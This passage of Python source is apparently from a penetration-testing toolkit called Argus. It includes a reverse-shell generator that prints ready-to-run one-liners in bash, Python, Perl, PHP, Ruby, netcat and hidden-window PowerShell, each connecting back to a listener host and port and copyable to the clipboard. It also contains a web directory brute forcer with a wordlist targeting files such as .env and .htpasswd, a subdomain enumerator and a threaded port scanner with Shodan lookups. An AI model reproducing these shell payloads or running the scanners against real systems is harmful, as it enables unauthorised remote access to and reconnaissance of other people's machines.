            print(f"  {len(ct_names)} unique name(s) found in CT logs:\n")
            for name in ct_names[:100]:
                print(f"    {name}")
            if len(ct_names) > 100:
                print(f"    ... {len(ct_names) - 100} more omitted")
        else:
            print("  No names returned from CT logs.")
        print()

    input("Press Enter to return...")


# ─────────────────────────────────────────────
#  REVERSE SHELL GENERATOR
# ─────────────────────────────────────────────

def run_reverse_shell_generator() -> None:
    """
    Generate common reverse-shell one-liners for authorised lab use.
    Nothing is executed — output only.
    """
    print_rule("Reverse Shell Generator")
    print("  For authorised penetration testing and CTF use only.")
    print("  No code is executed — payloads are displayed for copy/paste.\n")

    while True:
        lhost = input("  LHOST (your listener IP): ").strip()
        if lhost:
            break
        print("  [!] LHOST cannot be empty.")

    while True:
        lport_raw = input("  LPORT (your listener port) [4444]: ").strip() or "4444"
        if lport_raw.isdigit() and 1 <= int(lport_raw) <= 65535:
            lport = lport_raw
            break
        print("  [!] Enter a port number between 1 and 65535.")

    h, p = lhost, lport
    dq = chr(34)  # double-quote helper to avoid f-string nesting issues
    sq = chr(39)  # single-quote helper
    payloads = [
        ("bash (TCP)",
         f"bash -i >& /dev/tcp/{h}/{p} 0>&1"),
        ("bash (UDP)",
         f"bash -i >& /dev/udp/{h}/{p} 0>&1"),
        ("Python 3",
         f"python3 -c {sq}import socket,subprocess,os;"
         f"s=socket.socket();s.connect(({dq}{h}{dq},{p}));"
         "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
         f"subprocess.call([{dq}/bin/sh{dq}]){sq}"),
        ("Perl",
         f"perl -e {sq}use Socket;"
         f"$i={dq}{h}{dq};$p={p};"
         f"socket(S,PF_INET,SOCK_STREAM,getprotobyname({dq}tcp{dq}));"
         f"connect(S,sockaddr_in($p,inet_aton($i)));"
         f"open(STDIN,{dq}>&S{dq});open(STDOUT,{dq}>&S{dq});open(STDERR,{dq}>&S{dq});"
         f"exec({dq}/bin/sh -i{dq});{sq}"),
        ("PHP",
         f"php -r {sq}$sock=fsockopen({dq}{h}{dq},{p});"
         f"exec({dq}/bin/sh -i <&3 >&3 2>&3{dq});{sq}"),
        ("Ruby",
         f"ruby -rsocket -e{sq}f=TCPSocket.open({dq}{h}{dq},{p});"
         f"Process.spawn({dq}/bin/sh{dq},[:in,:out,:err]=>f){sq}"),
        ("nc (traditional)",
         f"nc -e /bin/sh {h} {p}"),
        ("nc (no -e / pipe)",
         f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {h} {p} >/tmp/f"),
        ("PowerShell (TCP)",
         f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command"
         f" {dq}$c=New-Object Net.Sockets.TCPClient({sq}{h}{sq},{p});"
         "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
         "while(($i=$s.Read($b,0,$b.Length)) -ne 0){"
         "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
         "$r=(iex $d 2>&1|Out-String);$s.Write([Text.Encoding]::ASCII.GetBytes($r),0,$r.Length)"
         f"{dq}"),
    ]

    print(f"\n  LHOST: {lhost}   LPORT: {lport}")
    print("  " + "─" * 58)
    for i, (name, payload) in enumerate(payloads, 1):
        print(f"\n  {i}. {name}")
        print(f"     {payload}")

    print("\n  " + "─" * 58)
    print("  Set up your listener:  nc -lvnp " + lport)

    try:
        import pyperclip
        raw = input("\n  Copy a payload to clipboard? Enter number (or Enter to skip): ").strip()
        if raw.isdigit() and 1 <= int(raw) <= len(payloads):
            pyperclip.copy(payloads[int(raw) - 1][1])
            print(f"  [+] Payload #{raw} copied to clipboard.")
    except ImportError:
        pass

    input("\nPress Enter to return...")


# ─────────────────────────────────────────────
#  DIRECTORY BRUTE FORCER
# ─────────────────────────────────────────────

# Built-in compact wordlist — works without an external file
_DIR_BUILTIN_WORDLIST = [
    "admin","administrator","login","logout","dashboard","panel","portal","console",
    "api","api/v1","api/v2","graphql","rest","rpc","swagger","openapi",
    "backup","backups","bak","old","archive","archives","tmp","temp","cache",
    "config","configuration","settings","setup","install","installer",
    "wp-admin","wp-login","wp-content","wp-includes","phpmyadmin","pma","adminer",
    "uploads","upload","files","file","media","assets","static","resources",
    "js","css","img","images","fonts","icons","download","downloads","export",
    "docs","doc","documentation","readme","changelog","license",
    "test","tests","testing","dev","development","staging","demo","sandbox",
    "user","users","account","accounts","profile","profiles","member","members",
    "register","signup","signin","auth","oauth","sso","token","reset",
    "search","sitemap","robots","favicon","crossdomain","health","status","ping",
    "logs","log","error","errors","debug","trace","metrics","monitor","info",
    ".git","git",".env","env",".htaccess",".htpasswd","web.config","server-status",
    "v1","v2","v3","version","versions",
]

_DIR_EXTENSIONS = ["", ".php", ".html", ".htm", ".txt", ".bak", ".old", ".json", ".xml", ".asp", ".aspx"]


def run_dir_brute_forcer() -> None:
    """
    Discover hidden web paths by sending HEAD/GET requests for each word
    in a wordlist. Flags 200, 301, 302, 403, and 500 responses.

    Uses concurrent.futures for parallel requests; progress is shown live.
    Saves hits to the results database.
    """
    import concurrent.futures
    import urllib.parse
    try:
        import requests
        from requests.exceptions import RequestException
    except ImportError:
        print("\n  [!] requests is not installed. Run: pip install requests")
        input("\nPress Enter to return...")
        return

    print_rule("Directory Brute Forcer")
    print("  Only test sites you own or have permission to test.\n")

    # ── Target URL ────────────────────────────────────────────────────
    while True:
        url = _normalize_url(input("  Target URL (e.g. https://example.com): ").strip())
        if url:
            break
        print("  [!] URL cannot be empty.")
    base = url.rstrip("/")

    # ── Wordlist ──────────────────────────────────────────────────────
    wl_path = input(
        f"  Wordlist path [built-in {len(_DIR_BUILTIN_WORDLIST)}-word list]: "
    ).strip().strip('"')
    if wl_path:
        if not os.path.isfile(wl_path):
            print(f"  [!] File not found: {wl_path}")
            input("\nPress Enter to return...")
            return
        with open(wl_path, "r", encoding="utf-8", errors="ignore") as f:
            words = [ln.strip().strip("/") for ln in f if ln.strip()]
    else:
        words = _DIR_BUILTIN_WORDLIST

    # ── Extensions ────────────────────────────────────────────────────
    ext_raw = input(
        "  Extensions to append (comma-separated, e.g. .php,.html) [none]: "
    ).strip()
    if ext_raw:
        exts = [""] + [e if e.startswith(".") else f".{e}" for e in ext_raw.split(",")]
    else:
        exts = [""]

    # ── Concurrency & timeout ─────────────────────────────────────────
    while True:
        raw = input("  Threads [10]: ").strip() or "10"
        if raw.isdigit() and 1 <= int(raw) <= 50:
            threads = int(raw)
            break
        print("  [!] Enter a number between 1 and 50.")

    while True:
        raw = input("  Request timeout seconds [5]: ").strip() or "5"
        if raw.isdigit() and 1 <= int(raw) <= 30:
            timeout = int(raw)
            break
        print("  [!] Enter 1-30.")

    # Build full target list
    targets = [f"{base}/{w}{ext}" for w in words for ext in exts]
    total   = len(targets)

    session = requests.Session()
    session.headers.update({"User-Agent": _random_user_agent("DirBrute")})

    hits     = []
    checked  = 0
    skipped  = 0

    INTERESTING = {200, 201, 204, 301, 302, 307, 401, 403, 405, 500}

    print(f"\n  [*] Probing {total:,} path(s) with {threads} thread(s)  (Ctrl-C to stop)\n")
    print(f"  {'STATUS':<7} {'SIZE':>7}  URL")
    print("  " + "─" * 68)

    def probe(target_url: str) -> tuple[str, int | None, int]:
        try:
            r = session.head(target_url, timeout=timeout, allow_redirects=False)
            # Fall back to GET if HEAD returns 405
            if r.status_code == 405:
                r = session.get(target_url, timeout=timeout, allow_redirects=False)
            return target_url, r.status_code, len(r.content)
        except Exception:
            return target_url, None, 0

    try:
        if RICH_AVAILABLE:
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                BarColumn(),
                MofNCompleteColumn(),
                TimeRemainingColumn(),
                console=console,
                transient=True,
            ) as progress:
                task = progress.add_task(f"Brute forcing {base[:45]}", total=total)
                with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
                    futures = {ex.submit(probe, t): t for t in targets}
                    for fut in concurrent.futures.as_completed(futures):
                        checked += 1
                        target_url, status, size = fut.result()
                        progress.advance(task)
                        if status is None:
                            skipped += 1
                            continue
                        if status in INTERESTING:
                            path = target_url[len(base):]
                            hits.append((status, size, path, target_url))
                            colour = (
                                "green"  if status == 200 else
                                "yellow" if status in {301, 302, 307} else
                                "red"    if status >= 400 else
                                "cyan"
                            )
                            progress.console.print(
                                f"  [[bold {colour}]{status}[/bold {colour}]]"
                                f"   {size:>7,}B  {path}"
                            )
        else:
            with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
                futures = {ex.submit(probe, t): t for t in targets}
                for fut in concurrent.futures.as_completed(futures):
                    checked += 1
                    if checked % 25 == 0 or checked == total:
                        print(
                            f"\r  [~] {checked:>{len(str(total))}}/{total} checked"
                            f"  |  {len(hits)} hit(s)   ",
                            end="", flush=True,
                        )
                    target_url, status, size = fut.result()
                    if status is None:
                        skipped += 1
                        continue
                    if status in INTERESTING:
                        path = target_url[len(base):]
                        hits.append((status, size, path, target_url))
                        print(
                            f"\r  [{status}]   {size:>7,}B  {path}"
                            + " " * 20
                        )
    except KeyboardInterrupt:
        print("\n\n  [*] Scan interrupted.")

    print(f"\n\n  Done — {checked:,} probed, {len(hits)} hit(s), {skipped} error(s).")
    print("  " + "─" * 68)

    if hits:
        print(f"\n  {'STATUS':<7} {'SIZE':>9}  PATH")
        print("  " + "─" * 68)
        for status, size, path, _ in sorted(hits):
            print(f"  [{status}]   {size:>9,}B  {path}")

        report_lines = [f"Directory Brute Force: {base}", f"Wordlist: {wl_path or 'built-in'}",
                        f"Extensions: {exts}", f"Total probed: {checked:,}", f"Hits: {len(hits)}", ""]
        for status, size, path, full_url in sorted(hits):
            report_lines.append(f"[{status}] {size:>9,}B  {full_url}")
        report = "\n".join(report_lines)
        run_id = _save_tool_run("dir_brute", base, f"{len(hits)} hit(s)", report)
        if run_id:
            print(f"\n  [+] Results saved to database (run #{run_id}).")
    else:
        print("  No interesting paths found.")

    input("\nPress Enter to return...")


# ─────────────────────────────────────────────
#  SUBDOMAIN ENUMERATOR
# ─────────────────────────────────────────────

def _enum_subdomains_ct(domain: str) -> list[str]:
    """
    Query crt.sh Certificate Transparency logs for passive subdomain discovery.

    crt.sh indexes every public TLS certificate ever issued, which means it
    surfaces historical subdomains, staging environments, and forgotten services
    that a wordlist would never reach.  Free and requires no API key.

    Returns a set of live FQDNs found in CT records for *domain*.
    Returns an empty set on any network or parse failure.
    """
    import urllib.request as _ur
    import json as _json
    url = f"https://crt.sh/?q=%.{domain}&output=json"
    try:
        req = _ur.Request(url, headers={"User-Agent": f"Argus/{APP_VERSION}"})
        with _ur.urlopen(req, timeout=12) as resp:
            data = _json.loads(resp.read().decode("utf-8", errors="replace"))
        names: set = set()
        for entry in data:
            for raw_name in entry.get("name_value", "").splitlines():
                name = raw_name.strip().lower().lstrip("*.")
                # Keep only real subdomains of the target domain
                if name.endswith(f".{domain}") and name != domain:
                    names.add(name)
        return names
    except Exception:
        return set()

_SUBDOMAIN_BUILTIN_WORDLIST = [
    "www","mail","ftp","smtp","pop","imap","pop3","email",
    "webmail","remote","vpn","api","app","dev","staging","test","demo",
    "admin","administrator","portal","panel","dashboard","login","secure",
    "shop","store","blog","news","forum","support","help","docs","kb",
    "status","monitor","metrics","health","cdn","media","images","static",
    "assets","files","upload","download","backup","data","db","database",
    "auth","sso","oauth","token","id","account","accounts","user","users",
    "mobile","m","wap","ns","ns1","ns2","dns","mx","mx1","mx2",
    "intranet","internal","corp","office","git","gitlab","github","jira",
    "jenkins","ci","build","deploy","prod","production","uat","qa","stage",
    "sandbox","local","localhost","proxy","gateway","edge","lb","load",
    "autodiscover","autoconfig","cpanel","whm","plesk","webdisk","ftp2",
    "v1","v2","v3","old","new","beta","alpha","preview","next","legacy",
]


def run_subdomain_enumerator() -> None:
    """
    Bruteforce subdomains by resolving <word>.<domain> via DNS.
    Optionally follows up with an HTTP/HTTPS probe on live hosts.

    Uses concurrent.futures for speed; shows live progress.
    Saves results to the database.
    """
    import concurrent.futures
    import socket as _sock

    print_rule("Subdomain Enumerator")
    print("  Only enumerate domains you own or have permission to test.\n")

    # ── Target domain ─────────────────────────────────────────────────
    while True:
        domain = input("  Target domain (e.g. example.com): ").strip().lower()
        domain = domain.replace("https://", "").replace("http://", "").rstrip("/")
        if domain and "." in domain:
            break
        print("  [!] Enter a valid domain name.")

    # ── CT log passive discovery (crt.sh) ─────────────────────────────
    print(f"\n  [*] Querying crt.sh Certificate Transparency logs for {domain} ...")
    ct_subdomains = _enum_subdomains_ct(domain)
    if ct_subdomains:
        ui_status("[+]", f"CT logs returned {len(ct_subdomains)} passive hit(s):", "ok", "text")
        for name in sorted(ct_subdomains)[:15]:
            print(f"      {name}")
        if len(ct_subdomains) > 15:
            print(f"      ... and {len(ct_subdomains) - 15} more")
    else:
        print("  [*] No CT log data found (crt.sh may be unreachable).")

    # Track which subdomains came from CT vs wordlist brute-force
    subdomain_sources: dict = {fqdn: "CT log" for fqdn in ct_subdomains}

    # ── Wordlist ──────────────────────────────────────────────────────
    wl_path = input(
        f"  Wordlist path [built-in {len(_SUBDOMAIN_BUILTIN_WORDLIST)}-word list]: "
    ).strip().strip('"')
    if wl_path:
        if not os.path.isfile(wl_path):
            print(f"  [!] File not found: {wl_path}")
            input("\nPress Enter to return...")
            return
        with open(wl_path, "r", encoding="utf-8", errors="ignore") as f:
            words = [ln.strip().lower() for ln in f if ln.strip()]
    else:
        words = _SUBDOMAIN_BUILTIN_WORDLIST

    # ── HTTP probe option ─────────────────────────────────────────────
    http_probe = False
    try:
        import requests as _req
        ans = input("  Probe live hosts over HTTP/HTTPS? (y/n) [y]: ").strip().lower()
        http_probe = (ans != "n")
    except ImportError:
        print("  [*] requests not installed — skipping HTTP probe.")

    # ── Concurrency ───────────────────────────────────────────────────
    while True:
        raw = input("  Threads [30]: ").strip() or "30"
        if raw.isdigit() and 1 <= int(raw) <= 100:
            threads = int(raw)
            break
        print("  [!] Enter 1-100.")

    total   = len(words)
    found   = []
    checked = 0

    print(f"\n  [*] Resolving {total:,} candidate(s) with {threads} thread(s)  (Ctrl-C to stop)\n")
    print(f"  {'SUBDOMAIN':<45} {'IPs'}")
    print("  " + "─" * 68)

    def resolve(word: str) -> tuple[str, list[str]]:
        fqdn = f"{word}.{domain}"
        try:
            addrs = list({a[4][0] for a in _sock.getaddrinfo(fqdn, None)})
            return fqdn, sorted(addrs)
        except _sock.gaierror:
            return fqdn, []
        except Exception:
            return fqdn, []

    def http_check(fqdn: str) -> tuple[int, str, str] | None:
        """Return (status_code, final_url, page_title) or None on failure."""
        import re as _re
        for scheme in ("https", "http"):
            try:
                r = _req.get(
                    f"{scheme}://{fqdn}",
                    timeout=5,
                    allow_redirects=True,
                    headers={"User-Agent": _random_user_agent("SubEnum")},
                )
                title_m = _re.search(r"<title[^>]*>([^<]{1,120})</title>", r.text, _re.IGNORECASE)
                title = title_m.group(1).strip() if title_m else ""
                return r.status_code, r.url, title
            except Exception:
                continue
        return None

    try:
        if RICH_AVAILABLE:
            with Progress(
                SpinnerColumn(),
                TextColumn("[progress.description]{task.description}"),
                BarColumn(),
                MofNCompleteColumn(),
                TimeRemainingColumn(),
                console=console,
                transient=True,
            ) as progress:
                task = progress.add_task(f"DNS brute-force  {domain}", total=total)
                with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
                    futures = {ex.submit(resolve, w): w for w in words}
                    for fut in concurrent.futures.as_completed(futures):
                        checked += 1
                        progress.advance(task)
                        fqdn, ips = fut.result()
                        if ips:
                            found.append((fqdn, ips))
                            if fqdn not in subdomain_sources:
                                subdomain_sources[fqdn] = "wordlist"
                            ip_str = ", ".join(ips[:4]) + (" ..." if len(ips) > 4 else "")
                            src_tag = f"[dim]({subdomain_sources[fqdn]})[/dim]"
                            progress.console.print(
                                f"  [bold green]{fqdn:<45}[/bold green] {ip_str}  {src_tag}"
                            )
        else:
            with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
                futures = {ex.submit(resolve, w): w for w in words}
                for fut in concurrent.futures.as_completed(futures):
                    checked += 1
                    if checked % 20 == 0 or checked == total:
                        print(
                            f"\r  [~] {checked:>{len(str(total))}}/{total} checked"
                            f"  |  {len(found)} found   ",
                            end="", flush=True,
                        )
                    fqdn, ips = fut.result()
                    if ips:
                        found.append((fqdn, ips))
                        if fqdn not in subdomain_sources:
                            subdomain_sources[fqdn] = "wordlist"
                        ip_str = ", ".join(ips[:4]) + (" ..." if len(ips) > 4 else "")
                        print(f"\r  {fqdn:<45} {ip_str}" + " " * 10)
    except KeyboardInterrupt:
        print("\n\n  [*] Scan interrupted.")

    print(f"\n\n  DNS phase done — {checked:,} checked, {len(found)} live subdomain(s).")

    # ── Merge CT-only subdomains not resolved by DNS phase ────────────
    resolved_fqdns = {fqdn for fqdn, _ in found}
    ct_only = ct_subdomains - resolved_fqdns
    if ct_only:
        print(f"  [*] Resolving {len(ct_only)} CT-log-only subdomain(s) ...")
        for fqdn in sorted(ct_only):
            try:
                addrs = list({a[4][0] for a in _sock.getaddrinfo(fqdn, None)})
                if addrs:
                    found.append((fqdn, sorted(addrs)))
                    subdomain_sources[fqdn] = "CT log"
            except _sock.gaierror:
                pass
            except Exception:
                pass

    # ── Optional HTTP probe ───────────────────────────────────────────
    http_results = {}
    if http_probe and found:
        print(f"\n  [*] HTTP probing {len(found)} live subdomain(s) ...\n")
        print(f"  {'STATUS':<7} {'SUBDOMAIN':<40} TITLE / URL")
        print("  " + "─" * 72)
        with concurrent.futures.ThreadPoolExecutor(max_workers=min(threads, 20)) as ex:
            http_futures = {ex.submit(http_check, fqdn): fqdn for fqdn, _ in found}
            for fut in concurrent.futures.as_completed(http_futures):
                fqdn = http_futures[fut]
                result = fut.result()
                if result:
                    status, final_url, title = result
                    http_results[fqdn] = result
                    print(f"  [{status}]  {fqdn:<40} {title[:50] or final_url[:50]}")

    # ── Save to DB ────────────────────────────────────────────────────
    if found:
        report_lines = [
            f"Subdomain Enumeration: {domain}",
            f"Wordlist: {wl_path or 'built-in'}",
            f"CT log hits (passive): {len(ct_subdomains)}",
            f"Checked: {checked:,}  Found: {len(found)}",
            "",
            "DNS RESULTS",
        ]
        for fqdn, ips in sorted(found):
            src = subdomain_sources.get(fqdn, "wordlist")
            report_lines.append(f"  [{src:<8}] {fqdn:<45} {', '.join(ips)}")
        if http_results:
            report_lines += ["", "HTTP PROBE"]
            for fqdn, (status, url, title) in sorted(http_results.items()):
                report_lines.append(f"  [{status}] {fqdn}  ->  {url}  |  {title}")
        report = "\n".join(report_lines)
        run_id = _save_tool_run("subdomain_enum", domain, f"{len(found)} subdomain(s)", report)
        if run_id:
            print(f"\n  [+] Results saved to database (run #{run_id}).")
    else:
        print("  No live subdomains found.")

    input("\nPress Enter to return...")


# ─────────────────────────────────────────────
#  MAIN MENU
# ─────────────────────────────────────────────

COMMON_PORTS = {
    # ── Core infrastructure ───────────────────────────────────────────
    20: "FTP-DATA",       21: "FTP",            22: "SSH",
    23: "TELNET",         25: "SMTP",            53: "DNS",
    67: "DHCP",           68: "DHCP-CLIENT",     69: "TFTP",
    79: "FINGER",         80: "HTTP",            88: "KERBEROS",
    110: "POP3",          111: "RPCBIND",        123: "NTP",
    135: "MSRPC",         137: "NETBIOS-NS",     138: "NETBIOS-DGM",
    139: "NETBIOS-SSN",   143: "IMAP",           161: "SNMP",
    162: "SNMP-TRAP",     179: "BGP",            389: "LDAP",
    443: "HTTPS",         445: "SMB",            464: "KPASSWD",
    465: "SMTPS",         500: "ISAKMP",         512: "REXEC",
    513: "RLOGIN",        514: "RSH-SYSLOG",     515: "LPD",
    587: "SMTP-SUB",      593: "HTTP-RPC-EPMAP", 636: "LDAPS",
    873: "RSYNC",         993: "IMAPS",          995: "POP3S",

    # ── Windows / Active Directory ────────────────────────────────────
    1433: "MSSQL",        1434: "MSSQL-BROWSER", 3268: "LDAP-GC",
    3269: "LDAPS-GC",     3389: "RDP",           5985: "WINRM-HTTP",
    5986: "WINRM-HTTPS",  47001: "WINRM-ALT",

    # ── Databases ─────────────────────────────────────────────────────
    1521: "ORACLE",       3306: "MYSQL",         5432: "POSTGRES",
    5984: "COUCHDB",      6379: "REDIS",         7474: "NEO4J",
    8086: "INFLUXDB",     9042: "CASSANDRA",     11211: "MEMCACHED",
    27017: "MONGODB",     27018: "MONGODB-SHARD", 28017: "MONGODB-WEB",

    # ── Web / proxy / API ─────────────────────────────────────────────
    3000: "HTTP-DEV",     4567: "SINATRA",        5000: "FLASK-DEV",
    7001: "WEBLOGIC",     7002: "WEBLOGIC-SSL",  8000: "HTTP-ALT2",
    8080: "HTTP-ALT",     8081: "HTTP-ALT3",     8443: "HTTPS-ALT",
    8888: "HTTP-JUPYTER", 9090: "OPENFIRE-ADMIN", 9200: "ELASTICSEARCH",
    9300: "ELASTICSEARCH-XPORT", 10000: "WEBMIN",

    # ── Remote access / management ────────────────────────────────────
    1194: "OPENVPN",      1723: "PPTP",          4500: "IPSEC-NAT-T",
    5800: "VNC-HTTP",     5900: "VNC",           5938: "TEAMVIEWER",
    8834: "NESSUS",

    # ── Message brokers / service mesh ───────────────────────────────
    1883: "MQTT",         4369: "ERLANG-EPMD",   5672: "AMQP",
    6066: "SPARK",        8161: "ACTIVEMQ-ADMIN", 9092: "KAFKA",
    15672: "RABBITMQ-MGMT", 61616: "ACTIVEMQ",

    # ── Containers / Kubernetes / cloud-native ───────────────────────
    2375: "DOCKER",       2376: "DOCKER-TLS",    2379: "ETCD-CLIENT",
    2380: "ETCD-PEER",    6443: "K8S-API",       8001: "K8S-DASHBOARD",
    10250: "KUBELET",     10255: "KUBELET-RO",

    # ── Service discovery / orchestration ────────────────────────────
    2181: "ZOOKEEPER",    8300: "CONSUL-RPC",    8301: "CONSUL-LAN",
    8500: "CONSUL-HTTP",  8600: "CONSUL-DNS",

    # ── Network services ─────────────────────────────────────────────
    3128: "SQUID-PROXY",  1080: "SOCKS",         8118: "PRIVOXY",
    2049: "NFS",

    # ── VoIP / streaming ─────────────────────────────────────────────
    554: "RTSP",          1935: "RTMP",          5060: "SIP",
    5061: "SIPS",

    # ── ICS / SCADA / OT (MITRE ATT&CK ICS) ─────────────────────────
    102: "S7COMM",        502: "MODBUS",         1911: "NIAGARA-FOX",
    4840: "OPC-UA",       4911: "NIAGARA-FOX-TLS", 9600: "OMRON-FINS",
    20000: "DNP3",        44818: "ETHERNET-IP",

    # ── IoT / CWMP / DVR ─────────────────────────────────────────────
    7547: "CWMP-TR069",   37777: "DAHUA-DVR",

    # ── Common C2 / attacker-favored ports (MITRE T1571) ─────────────
    # Attackers frequently use these to blend with legitimate traffic
    # or because services on them are commonly exposed and unpatched.
    4444: "METASPLOIT-DEFAULT", 4445: "METASPLOIT-ALT",
    6666: "IRC-ALT",            6667: "IRC",
    6697: "IRC-TLS",            7000: "IRC-ALT2",
    31337: "ELITE-LEGACY",
}


def _parse_ports(raw: str) -> list[int]:
    raw = raw.strip()
    if not raw:
        return sorted(COMMON_PORTS)
    ports = set()
    for part in raw.split(","):
        part = part.strip()
        if not part:
            continue
        if "-" in part:
            start_s, end_s = part.split("-", 1)
            start, end = int(start_s), int(end_s)
            if start > end:
                start, end = end, start
            ports.update(range(start, end + 1))
        else:
            ports.add(int(part))
    valid = sorted(p for p in ports if 1 <= p <= 65535)
    if len(valid) > 2000:
        raise ValueError("Port list too large. Keep scans to 2,000 ports or fewer.")
    return valid


def run_port_scanner() -> None:
    """
    TCP port scanner with optional Shodan enrichment.

    Accepts a host and a port range or comma-separated list, then probes
    each port concurrently using ThreadPoolExecutor.  Common service names
    are resolved from a built-in table.  If a Shodan API key is configured,
    known open ports are enriched with banner and CVE data from Shodan.
    For authorized use on hosts you own or have permission to test.
    """
    print_rule("Port Scanner")

    config     = _load_argus_config()
    shodan_key = config.get("shodan_key", "")

    if shodan_key:
        print("  [+] Shodan key loaded — passive comparison will run after active scan.")
    else:
        print("  [i] No Shodan key — using InternetDB for passive comparison (free).")
    print()

    print("  Only scan hosts you own or have explicit permission to test.\n")
    host = input("  Host/IP: ").strip()
    raw_ports = input("  Ports (blank=common, e.g. 22,80,443 or 1-1024): ").strip()
    try:
        ports = _parse_ports(raw_ports)
    except Exception as e:
        print(f"  [!] Invalid ports: {e}")
        input("\nPress Enter to return...")
        return
    timeout_raw = input("  Timeout seconds [0.5]: ").strip() or "0.5"
    try:
        timeout = max(0.1, min(float(timeout_raw), 5.0))
    except ValueError:
        timeout = 0.5

    # Resolve host to IP for Shodan lookup
    try:
        target_ip = socket.gethostbyname(host)
    except Exception:
        target_ip = None

    # ── Thread count ──────────────────────────────────────────────────
    while True:
        raw_threads = input("  Threads [100]: ").strip() or "100"
        if raw_threads.isdigit() and 1 <= int(raw_threads) <= 500:
            threads = int(raw_threads)
            break
        print("  [!] Enter 1-500.")

    import concurrent.futures as _cf_ports

    def _probe_port(port: int) -> tuple[int, str] | None:
        try:
            with socket.create_connection((host, port), timeout=timeout):
                return port, COMMON_PORTS.get(port, "unknown")
        except (socket.timeout, OSError):
            return None

    open_ports   = []
    total_ports  = len(ports)
    print(f"\n  [*] Scanning {host} ({total_ports} port(s)) with {threads} threads  (Ctrl-C to stop) ...\n")

    if RICH_AVAILABLE:
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            MofNCompleteColumn(),
            TimeRemainingColumn(),
            console=console,
            transient=True,
        ) as progress:
            task = progress.add_task(f"Scanning {host}", total=total_ports)
            try:
                with _cf_ports.ThreadPoolExecutor(max_workers=threads) as ex:
                    futures = {ex.submit(_probe_port, p): p for p in ports}
                    for fut in _cf_ports.as_completed(futures):
                        progress.advance(task)
                        result = fut.result()
                        if result:
                            port_num, service = result
                            open_ports.append((port_num, service))
                            progress.console.print(
                                f"  [bold green][+][/bold green] OPEN  {port_num:<5} {service}"
                            )
            except KeyboardInterrupt:
                progress.console.print("\n  [*] Scan interrupted.")
    else:
        checked_ports = 0
        try:
            with _cf_ports.ThreadPoolExecutor(max_workers=threads) as ex:
                futures = {ex.submit(_probe_port, p): p for p in ports}
                for fut in _cf_ports.as_completed(futures):
                    checked_ports += 1
                    if checked_ports % 50 == 0 or checked_ports == total_ports:
                        print(
                            f"\r  [~] {checked_ports:>{len(str(total_ports))}}/{total_ports}"
                            f" scanned  |  {len(open_ports)} open   ",
                            end="", flush=True,
                        )
                    result = fut.result()
                    if result:
                        port_num, service = result
                        open_ports.append((port_num, service))
                        print(f"\r  [+] OPEN  {port_num:<5} {service}" + " " * 30)
        except KeyboardInterrupt:
            print("\n\n  [*] Scan interrupted.")
        print()
    open_ports.sort()

    report_lines = [f"Port scan: {host}"]
    if target_ip and target_ip != host:
        report_lines.append(f"Resolved IP: {target_ip}")
    summary = f"{len(open_ports)} open ports"
    report_lines += [summary] + [f"{p} {s}" for p, s in open_ports]

    # ── Passive comparison ────────────────────────────────────────────
    if target_ip:
        try:
            ip_obj = ipaddress.ip_address(target_ip)
            is_global = ip_obj.is_global
        except Exception:
            is_global = False

        if is_global:
            print(f"\n  {'=' * 56}")
            print(f"  PASSIVE RECON COMPARISON (Shodan vs Active Scan)")
            print(f"  {'=' * 56}")
            print(f"  Active scan found : {len(open_ports)} open port(s)")

            passive_ports = set()
            passive_cves  = []
            passive_tags  = []

            if shodan_key:
                print(f"  [*] Querying Shodan for {target_ip} ...")
                try:
                    sd = _ioc_query_shodan_host(target_ip, shodan_key)
                    if "error" not in sd:
                        passive_ports = set(sd.get("ports", []))
                        passive_cves  = list((sd.get("vulns") or {}).keys())
                        passive_tags  = sd.get("tags") or []
                        banners       = sd.get("data") or []
                        last_seen     = (sd.get("last_update") or "")[:10]

                        print(f"  Shodan last seen  : {last_seen}")
                        print(f"  Shodan sees       : {len(passive_ports)} open port(s)")

                        active_set  = {p for p, _ in open_ports}
                        only_active = sorted(active_set - passive_ports)
                        only_shodan = sorted(passive_ports - active_set)
                        both        = sorted(active_set & passive_ports)

                        if both:
                            print(f"\n  Seen by both      : {', '.join(str(p) for p in both)}")
                        if only_active:
                            print(f"  Only in active    : {', '.join(str(p) for p in only_active)}  [new / recently opened]")
                        if only_shodan:
                            print(f"  Only in Shodan    : {', '.join(str(p) for p in only_shodan)}  [closed / filtered since last crawl]")

                        if banners:
                            print(f"\n  Services (Shodan):")
                            for svc in sorted(banners, key=lambda x: x.get("port", 0))[:10]:
                                prod = f"{svc.get('product','')} {svc.get('version','')}".strip()
                                tport = svc.get("transport", "tcp")
                                print(f"    {svc.get('port')}/{tport:<4} {prod or 'unknown'}")

                        if passive_cves:
                            print(f"\n  CVEs ({len(passive_cves)}):")
                            for cve in passive_cves[:8]:
                                print(f"    {cve}")
                            if len(passive_cves) > 8:
                                print(f"    ... {len(passive_cves) - 8} more")
                        if passive_tags:
                            print(f"  Tags              : {', '.join(passive_tags)}")

                        report_lines += [
                            "", "Shodan Passive Comparison:",
                            f"  Last seen       : {last_seen}",
                            f"  Shodan ports    : {', '.join(str(p) for p in sorted(passive_ports))}",
                            f"  Only active     : {', '.join(str(p) for p in only_active)}",
                            f"  Only Shodan     : {', '.join(str(p) for p in only_shodan)}",
                            f"  CVEs            : {', '.join(passive_cves[:10])}",
                            f"  Tags            : {', '.join(passive_tags)}",
                        ]
                    elif sd.get("error") == "not_found":
                        print("  [i] No Shodan data for this IP.")
                    else:
                        print(f"  [!] {sd['error']}")
                except Exception as e:
                    print(f"  [!] Shodan query failed: {_scrub_key(e, shodan_key)}")
            else:
                print(f"  [*] Querying InternetDB for {target_ip} ...")
                try:
                    idb = _ioc_query_internetdb(target_ip)
                    if "error" not in idb:
                        passive_ports = set(idb.get("ports", []))
                        passive_cves  = idb.get("vulns", [])
                        passive_tags  = idb.get("tags", [])

